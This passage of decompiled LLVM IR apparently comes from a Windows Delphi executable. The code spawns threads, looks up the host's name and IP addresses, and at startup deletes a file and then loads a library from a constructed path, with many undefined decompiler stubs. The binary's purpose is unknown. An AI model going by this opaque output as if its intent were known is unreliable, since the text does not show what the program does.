  %3 = call i32* @GetDC(i32* %2), !insn.addr !2003
  %4 = ptrtoint i32* %3 to i32, !insn.addr !2003
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !2004
  %6 = inttoptr i32 %5 to i32*, !insn.addr !2005
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !2005
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !2006
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !2007
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !2008
  %11 = inttoptr i32 %1 to i32*, !insn.addr !2009
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !2009
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !2010
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !2011
  %16 = ashr i32 %15, 31, !insn.addr !2012
  %17 = zext i32 %15 to i64, !insn.addr !2013
  %18 = zext i32 %16 to i64, !insn.addr !2013
  %19 = mul i64 %18, 4294967296, !insn.addr !2013
  %20 = or i64 %19, %17, !insn.addr !2013
  %21 = zext i32 %4 to i64, !insn.addr !2013
  %22 = sdiv i64 %20, %21, !insn.addr !2013
  %23 = trunc i64 %22 to i32, !insn.addr !2013
  ret i32 %23, !insn.addr !2014
}

define i32 @function_40783c() local_unnamed_addr {
dec_label_pc_40783c:
  %esp.0.reg2mem = alloca i32, !insn.addr !2015
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2016
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !2016
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !2016
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2017
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !2018
  %3 = icmp eq i32 %2, 0, !insn.addr !2018
  br i1 %3, label %dec_label_pc_407878, label %dec_label_pc_407865, !insn.addr !2019

dec_label_pc_407865:                              ; preds = %dec_label_pc_40783c
  %4 = inttoptr i32 %2 to i32*, !insn.addr !2020
  store i32 0, i32* %4, align 4, !insn.addr !2020
  br label %dec_label_pc_407878, !insn.addr !2021

dec_label_pc_407878:                              ; preds = %dec_label_pc_407865, %dec_label_pc_40783c
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !2022
  %6 = icmp eq i32 %5, 0, !insn.addr !2022
  br i1 %6, label %dec_label_pc_40788c, label %dec_label_pc_407882, !insn.addr !2023

dec_label_pc_407882:                              ; preds = %dec_label_pc_407878
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !2024
  %8 = icmp eq i32 %7, 0, !insn.addr !2024
  %9 = icmp eq i1 %8, false, !insn.addr !2025
  br i1 %9, label %dec_label_pc_407896, label %dec_label_pc_40788c, !insn.addr !2025

dec_label_pc_40788c:                              ; preds = %dec_label_pc_407882, %dec_label_pc_407878
  %10 = call i32 @function_407970(), !insn.addr !2026
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2027
  br label %dec_label_pc_407933, !insn.addr !2027

dec_label_pc_407896:                              ; preds = %dec_label_pc_407882
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2028
  %12 = icmp eq i8 %11, 0, !insn.addr !2028
  br i1 %12, label %dec_label_pc_4078bf, label %dec_label_pc_4078a0, !insn.addr !2029

dec_label_pc_4078a0:                              ; preds = %dec_label_pc_407896
  %13 = call i32 @function_407158(), !insn.addr !2030
  %14 = icmp eq i32 %13, 0, !insn.addr !2031
  br i1 %14, label %dec_label_pc_4078bf, label %dec_label_pc_4078b8, !insn.addr !2032

dec_label_pc_4078b8:                              ; preds = %dec_label_pc_4078a0
  %15 = call i32 @function_407970(), !insn.addr !2033
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !2034
  br label %dec_label_pc_407933, !insn.addr !2034

dec_label_pc_4078bf:                              ; preds = %dec_label_pc_4078a0, %dec_label_pc_407896
  %16 = call i32 @"@LStrCatN"(), !insn.addr !2035
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2036
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4220988 to i32*), i32 0, i32* null), !insn.addr !2037
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4220988 to i32*), i32 0, i32* null), !insn.addr !2038
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !2039
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !2039
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4220988 to i32*), i32 0, i32* null), !insn.addr !2040
  %23 = call i32 @function_407970(), !insn.addr !2041
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !2041
  br label %dec_label_pc_407933, !insn.addr !2041

dec_label_pc_407933:                              ; preds = %dec_label_pc_4078bf, %dec_label_pc_4078b8, %dec_label_pc_40788c
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !2042
  %25 = load i32, i32* %24, align 4, !insn.addr !2042
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !2043
  %26 = add i32 %esp.0.reload, 8, !insn.addr !2044
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2044
  store i32 4225360, i32* %27, align 4, !insn.addr !2044
  %28 = call i32 @"@LStrClr"(), !insn.addr !2045
  ret i32 %28, !insn.addr !2046
}

define i32 @function_407949() local_unnamed_addr {
dec_label_pc_407949:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2047
  ret i32 %0, !insn.addr !2047
}

define i32 @function_40794e() local_unnamed_addr {
dec_label_pc_40794e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2048
}

define i32 @function_407950(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407950:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2049
}

define i32 @function_407970() local_unnamed_addr {
dec_label_pc_407970:
  %0 = call i32 @"@LStrClr"(), !insn.addr !2050
  %1 = call i32 @"@LStrClr"(), !insn.addr !2051
  ret i32 %1, !insn.addr !2052
}

define i32 @function_407988() local_unnamed_addr {
dec_label_pc_407988:
  %eax.0.reg2mem = alloca i32, !insn.addr !2053
  %esp.0.reg2mem = alloca i32, !insn.addr !2053
  %esp.15.reg2mem = alloca i32, !insn.addr !2053
  %storemerge6.reg2mem = alloca i32, !insn.addr !2053
  %.reg2mem = alloca i32, !insn.addr !2053
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !2053
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !2054
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !2055
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !2056
  %5 = call i32 @"@LStrClr"(), !insn.addr !2057
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !2058
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !2058
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !2059
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !2060
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !2061
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !2061
  %11 = icmp eq %hostent* %9, null, !insn.addr !2062
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2063
  br i1 %11, label %dec_label_pc_4079e6, label %dec_label_pc_4079c0, !insn.addr !2063

dec_label_pc_4079c0:                              ; preds = %dec_label_pc_407988
  %12 = add i32 %10, 12, !insn.addr !2064
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2064
  %14 = load i32, i32* %13, align 4, !insn.addr !2064
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2065
  %16 = load i32, i32* %15, align 4, !insn.addr !2065
  %17 = icmp eq i32 %16, 0, !insn.addr !2066
  %18 = icmp eq i1 %17, false, !insn.addr !2067
  br i1 %18, label %dec_label_pc_4079c7.lr.ph, label %dec_label_pc_4079e1, !insn.addr !2067

dec_label_pc_4079c7.lr.ph:                        ; preds = %dec_label_pc_4079c0
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !2060
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_4079c7

dec_label_pc_4079c7:                              ; preds = %dec_label_pc_4079c7.lr.ph, %dec_label_pc_4079d9
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !2068
  %21 = icmp eq i1 %20, false, !insn.addr !2069
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !2069
  br i1 %21, label %dec_label_pc_4079d9, label %dec_label_pc_4079cb, !insn.addr !2069

dec_label_pc_4079cb:                              ; preds = %dec_label_pc_4079c7
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !2070
  %23 = load i32, i32* %22, align 4, !insn.addr !2070
  %24 = add i32 %esp.15.reload, -4, !insn.addr !2070
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2070
  store i32 %23, i32* %25, align 4, !insn.addr !2070
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !2071
  %27 = call i32 @StrPas(), !insn.addr !2072
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !2072
  br label %dec_label_pc_4079d9, !insn.addr !2072

dec_label_pc_4079d9:                              ; preds = %dec_label_pc_4079cb, %dec_label_pc_4079c7
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !2073
  %29 = mul i32 %28, 4, !insn.addr !2065
  %30 = add i32 %29, %14, !insn.addr !2065
  %31 = inttoptr i32 %30 to i32*, !insn.addr !2065
  %32 = load i32, i32* %31, align 4, !insn.addr !2065
  %33 = icmp eq i32 %32, 0, !insn.addr !2066
  %34 = icmp eq i1 %33, false, !insn.addr !2067
  store i32 %32, i32* %.reg2mem, !insn.addr !2067
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !2067
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !2067
  br i1 %34, label %dec_label_pc_4079c7, label %dec_label_pc_4079e1, !insn.addr !2067

dec_label_pc_4079e1:                              ; preds = %dec_label_pc_4079d9, %dec_label_pc_4079c0
  %35 = call i32 @WSACleanup(), !insn.addr !2074
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !2074
  br label %dec_label_pc_4079e6, !insn.addr !2074

dec_label_pc_4079e6:                              ; preds = %dec_label_pc_4079e1, %dec_label_pc_407988
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2075
}

define i32 @function_4079f4() local_unnamed_addr {
dec_label_pc_4079f4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2076
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2076
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2076
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2077
  %2 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !2078
  %3 = add i32 %2, 1, !insn.addr !2078
  store i32 %3, i32* @global_var_4096e8, align 4, !insn.addr !2078
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2079
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2080
  ret i32 0, !insn.addr !2081
}

define i32 @function_407a19() local_unnamed_addr {
dec_label_pc_407a19:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2082
  ret i32 %0, !insn.addr !2082
}

define i32 @function_407a1e() local_unnamed_addr {
dec_label_pc_407a1e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2083
}

define i32 @function_407a20(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a20:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2084
}

define i32 @function_407a24() local_unnamed_addr {
dec_label_pc_407a24:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !2085
  %2 = add i32 %1, -1, !insn.addr !2085
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !2085
  ret i32 %0, !insn.addr !2086
}

define i32 @function_407a2c() local_unnamed_addr {
dec_label_pc_407a2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2087
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407a57:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2088
  ret i32 %0, !insn.addr !2088
}

define i32 @function_407a5c() local_unnamed_addr {
dec_label_pc_407a5c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2089
}

define i32 @function_407a5e(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a5e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2090
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407b40:
  %esp.2.reg2mem = alloca i32, !insn.addr !2091
  %esp.1.reg2mem = alloca i32, !insn.addr !2091
  %esp.0.reg2mem = alloca i32, !insn.addr !2091
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2092
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2093
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2093
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2093
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2094
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2095
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096ec to i8*), i32 0), !insn.addr !2096
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096ec to i32), !insn.addr !2097
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2097
  store i8 0, i8* %6, align 1, !insn.addr !2097
  %7 = call i32 @"@LStrAsg"(), !insn.addr !2098
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !2099
  %9 = call i32 @function_407580(), !insn.addr !2100
  %10 = call i32 @"@LStrAsg"(), !insn.addr !2101
  %11 = call i32 @function_4075f8(), !insn.addr !2102
  %12 = trunc i32 %11 to i8, !insn.addr !2103
  %13 = icmp eq i8 %12, 0, !insn.addr !2103
  br i1 %13, label %dec_label_pc_407c57, label %dec_label_pc_407bdc, !insn.addr !2104

dec_label_pc_407bdc:                              ; preds = %dec_label_pc_407b40
  %14 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2105
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2106
  store i32 -1, i32* %15, align 4, !insn.addr !2106
  %16 = call i32 @"@LStrFromArray"(), !insn.addr !2107
  %17 = call i32 @function_4075c0(), !insn.addr !2108
  %18 = call i32 @"@LStrAsg"(), !insn.addr !2109
  %19 = call i32 @"@LStrCat3"(), !insn.addr !2110
  %20 = call i32 @function_4036c8(), !insn.addr !2111
  %21 = inttoptr i32 %20 to i8*, !insn.addr !2112
  %22 = call i1 @DeleteFileA(i8* %21), !insn.addr !2113
  %23 = call i32 @"@LStrCat3"(), !insn.addr !2114
  %24 = call i32 @function_4036c8(), !insn.addr !2115
  %25 = inttoptr i32 %24 to i8*, !insn.addr !2116
  store i8* %25, i8** %stack_var_-136, align 4, !insn.addr !2116
  %26 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2116
  %27 = call i32* @LoadLibraryA(i8* %25), !insn.addr !2117
  %28 = ptrtoint i32* %27 to i32, !insn.addr !2117
  store i32 %28, i32* @global_var_408118, align 4, !insn.addr !2118
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2119
  br label %dec_label_pc_407c84, !insn.addr !2119

dec_label_pc_407c57:                              ; preds = %dec_label_pc_407b40
  %29 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2095
  %30 = call i32 @function_4065e4(), !insn.addr !2120
  %31 = call i32 @function_4075f8(), !insn.addr !2121
  %32 = trunc i32 %31 to i8, !insn.addr !2122
  %33 = icmp eq i8 %32, 0, !insn.addr !2122
  store i32 %29, i32* %esp.2.reg2mem, !insn.addr !2123
  br i1 %33, label %dec_label_pc_407dc6, label %dec_label_pc_407c79, !insn.addr !2123

dec_label_pc_407c79:                              ; preds = %dec_label_pc_407c57
  %34 = load i32, i32* @global_var_408138, align 4, !insn.addr !2124
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2125
  store i32 -1, i32* %35, align 4, !insn.addr !2125
  store i32 %29, i32* %esp.0.reg2mem, !insn.addr !2125
  br label %dec_label_pc_407c84, !insn.addr !2125

dec_label_pc_407c84:                              ; preds = %dec_label_pc_407c79, %dec_label_pc_407bdc
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %36 = add i32 %esp.0.reload, -4, !insn.addr !2126
  %37 = inttoptr i32 %36 to i32*, !insn.addr !2126
  store i32 260, i32* %37, align 4, !insn.addr !2126
  %38 = add i32 %esp.0.reload, -8, !insn.addr !2127
  %39 = inttoptr i32 %38 to i32*, !insn.addr !2127
  store i32 ptrtoint (i8** @global_var_4096ec to i32), i32* %39, align 4, !insn.addr !2127
  %40 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2128
  %41 = ptrtoint i32 (i32, i32, i32)* %40 to i32, !insn.addr !2128
  %42 = add i32 %esp.0.reload, -12, !insn.addr !2129
  %43 = inttoptr i32 %42 to i32*, !insn.addr !2129
  store i32 %41, i32* %43, align 4, !insn.addr !2129
  %44 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2130
  %45 = add i32 %44, ptrtoint (i8** @global_var_4096ec to i32), !insn.addr !2131
  %46 = inttoptr i32 %45 to i8*, !insn.addr !2131
  store i8 0, i8* %46, align 1, !insn.addr !2131
  %47 = call i32 @"@LStrFromArray"(), !insn.addr !2132
  %48 = call i32 @function_4075c0(), !insn.addr !2133
  %49 = call i32 @"@LStrAsg"(), !insn.addr !2134
  %50 = call i32 @"@LStrCat3"(), !insn.addr !2135
  %51 = load i32, i32* @global_var_408138, align 4, !insn.addr !2136
  %52 = icmp eq i32 %51, 0, !insn.addr !2136
  br i1 %52, label %dec_label_pc_407d1d, label %dec_label_pc_407cea, !insn.addr !2137

dec_label_pc_407cea:                              ; preds = %dec_label_pc_407c84
  %53 = add i32 %esp.0.reload, -16, !insn.addr !2138
  %54 = inttoptr i32 %53 to i32*, !insn.addr !2138
  store i32 ptrtoint ([16 x i8]* @global_var_407e48 to i32), i32* %54, align 4, !insn.addr !2138
  %55 = add i32 %esp.0.reload, -20, !insn.addr !2139
  %56 = inttoptr i32 %55 to i32*, !insn.addr !2139
  store i32 ptrtoint ([8 x i8]* @global_var_407e58 to i32), i32* %56, align 4, !insn.addr !2139
  %57 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2140
  %58 = icmp eq i32* %57, null, !insn.addr !2141
  %59 = icmp eq i1 %58, false, !insn.addr !2142
  store i32 %55, i32* %esp.2.reg2mem, !insn.addr !2142
  br i1 %59, label %dec_label_pc_407dc6, label %dec_label_pc_407d01, !insn.addr !2142

dec_label_pc_407d01:                              ; preds = %dec_label_pc_407cea
  %60 = add i32 %esp.0.reload, -24, !insn.addr !2143
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2143
  store i32 ptrtoint (i32* @global_var_409804 to i32), i32* %61, align 4, !insn.addr !2143
  %62 = add i32 %esp.0.reload, -28, !insn.addr !2144
  %63 = inttoptr i32 %62 to i32*, !insn.addr !2144
  store i32 0, i32* %63, align 4, !insn.addr !2144
  %64 = add i32 %esp.0.reload, -32, !insn.addr !2145
  %65 = inttoptr i32 %64 to i32*, !insn.addr !2145
  store i32 66, i32* %65, align 4, !insn.addr !2145
  %66 = add i32 %esp.0.reload, -36, !insn.addr !2146
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2146
  store i32 4222048, i32* %67, align 4, !insn.addr !2146
  %68 = add i32 %esp.0.reload, -40, !insn.addr !2147
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2147
  store i32 0, i32* %69, align 4, !insn.addr !2147
  %70 = add i32 %esp.0.reload, -44, !insn.addr !2148
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2148
  store i32 0, i32* %71, align 4, !insn.addr !2148
  %72 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2149
  store i32 %70, i32* %esp.2.reg2mem, !insn.addr !2150
  br label %dec_label_pc_407dc6, !insn.addr !2150

dec_label_pc_407d1d:                              ; preds = %dec_label_pc_407c84
  %73 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2151
  %74 = icmp eq i32 %73, 0, !insn.addr !2151
  store i32 %42, i32* %esp.2.reg2mem, !insn.addr !2152
  br i1 %74, label %dec_label_pc_407dc6, label %dec_label_pc_407d2b, !insn.addr !2152

dec_label_pc_407d2b:                              ; preds = %dec_label_pc_407d1d
  %75 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2153
  %76 = icmp eq i8 %75, 0, !insn.addr !2153
  br i1 %76, label %dec_label_pc_407d3a, label %dec_label_pc_407d35, !insn.addr !2154

dec_label_pc_407d35:                              ; preds = %dec_label_pc_407d2b
  %77 = call i32 @function_406e20(), !insn.addr !2155
  br label %dec_label_pc_407d3a, !insn.addr !2155

dec_label_pc_407d3a:                              ; preds = %dec_label_pc_407d35, %dec_label_pc_407d2b
  %78 = load i32, i32* @global_var_408148, align 4, !insn.addr !2156
  %79 = icmp slt i32 %78, 1, !insn.addr !2157
  br i1 %79, label %dec_label_pc_407d77, label %dec_label_pc_407d44, !insn.addr !2157

dec_label_pc_407d44:                              ; preds = %dec_label_pc_407d3a
  %80 = call i32 @function_404f60(), !insn.addr !2158
  %81 = call i32 @"@LStrCmp"(), !insn.addr !2159
  %82 = load i32, i32* @global_var_408154, align 4, !insn.addr !2160
  %83 = inttoptr i32 %82 to i32*, !insn.addr !2161
  store i32 -1, i32* %83, align 4, !insn.addr !2161
  %84 = load i32, i32* @global_var_408154, align 4, !insn.addr !2162
  %85 = icmp eq i32 %84, 0, !insn.addr !2162
  br i1 %85, label %dec_label_pc_407d77, label %dec_label_pc_407d72, !insn.addr !2163

dec_label_pc_407d72:                              ; preds = %dec_label_pc_407d44
  %86 = call i32 @function_406500(), !insn.addr !2164
  br label %dec_label_pc_407d77, !insn.addr !2164

dec_label_pc_407d77:                              ; preds = %dec_label_pc_407d72, %dec_label_pc_407d44, %dec_label_pc_407d3a
  %87 = add i32 %esp.0.reload, -16, !insn.addr !2165
  %88 = inttoptr i32 %87 to i32*, !insn.addr !2165
  store i32 3, i32* %88, align 4, !insn.addr !2165
  %89 = add i32 %esp.0.reload, -20, !insn.addr !2166
  %90 = inttoptr i32 %89 to i32*, !insn.addr !2166
  store i32 16065, i32* %90, align 4, !insn.addr !2166
  %91 = load i32, i32* @global_var_408118, align 4, !insn.addr !2167
  %92 = add i32 %esp.0.reload, -24, !insn.addr !2168
  %93 = inttoptr i32 %92 to i32*, !insn.addr !2168
  store i32 %91, i32* %93, align 4, !insn.addr !2168
  %94 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2169
  %95 = icmp eq i32* %94, null, !insn.addr !2170
  %96 = icmp eq i1 %95, false, !insn.addr !2171
  store i32 %92, i32* %esp.1.reg2mem, !insn.addr !2171
  br i1 %96, label %dec_label_pc_407db7, label %dec_label_pc_407d8d, !insn.addr !2171

dec_label_pc_407d8d:                              ; preds = %dec_label_pc_407d77
  %97 = add i32 %esp.0.reload, -28, !insn.addr !2172
  %98 = inttoptr i32 %97 to i32*, !insn.addr !2172
  store i32 14, i32* %98, align 4, !insn.addr !2172
  %99 = add i32 %esp.0.reload, -32, !insn.addr !2173
  %100 = inttoptr i32 %99 to i32*, !insn.addr !2173
  store i32 16065, i32* %100, align 4, !insn.addr !2173
  %101 = load i32, i32* @global_var_408118, align 4, !insn.addr !2174
  %102 = add i32 %esp.0.reload, -36, !insn.addr !2175
  %103 = inttoptr i32 %102 to i32*, !insn.addr !2175
  store i32 %101, i32* %103, align 4, !insn.addr !2175
  %104 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2176
  %105 = icmp eq i32* %104, null, !insn.addr !2177
  %106 = icmp eq i1 %105, false, !insn.addr !2178
  store i32 %102, i32* %esp.1.reg2mem, !insn.addr !2178
  br i1 %106, label %dec_label_pc_407db7, label %dec_label_pc_407da3, !insn.addr !2178

dec_label_pc_407da3:                              ; preds = %dec_label_pc_407d8d
  %107 = add i32 %esp.0.reload, -40, !insn.addr !2179
  %108 = inttoptr i32 %107 to i32*, !insn.addr !2179
  store i32 16065, i32* %108, align 4, !insn.addr !2179
  %109 = load i32, i32* @global_var_408118, align 4, !insn.addr !2180
  %110 = add i32 %esp.0.reload, -44, !insn.addr !2181
  %111 = inttoptr i32 %110 to i32*, !insn.addr !2181
  store i32 %109, i32* %111, align 4, !insn.addr !2181
  %112 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2182
  %113 = icmp eq i32* %112, null, !insn.addr !2183
  store i32 %110, i32* %esp.1.reg2mem, !insn.addr !2184
  store i32 %110, i32* %esp.2.reg2mem, !insn.addr !2184
  br i1 %113, label %dec_label_pc_407dc6, label %dec_label_pc_407db7, !insn.addr !2184

dec_label_pc_407db7:                              ; preds = %dec_label_pc_407da3, %dec_label_pc_407d8d, %dec_label_pc_407d77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %114 = call i32 @function_405328(), !insn.addr !2185
  store i32 4225580, i32* @global_var_409654, align 4, !insn.addr !2186
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2186
  br label %dec_label_pc_407dc6, !insn.addr !2186

dec_label_pc_407dc6:                              ; preds = %dec_label_pc_407db7, %dec_label_pc_407da3, %dec_label_pc_407d1d, %dec_label_pc_407d01, %dec_label_pc_407cea, %dec_label_pc_407c57
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %115 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2187
  %116 = load i32, i32* %115, align 4, !insn.addr !2187
  call void @__writefsdword(i32 0, i32 %116), !insn.addr !2188
  %117 = add i32 %esp.2.reload, 8, !insn.addr !2189
  %118 = inttoptr i32 %117 to i32*, !insn.addr !2189
  store i32 4226536, i32* %118, align 4, !insn.addr !2189
  %119 = call i32 @"@LStrArrayClr"(), !insn.addr !2190
  ret i32 %119, !insn.addr !2191
}

define i32 @function_407de1() local_unnamed_addr {
dec_label_pc_407de1:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2192
  ret i32 %0, !insn.addr !2192
}

define i32 @function_407de6() local_unnamed_addr {
dec_label_pc_407de6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2193
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

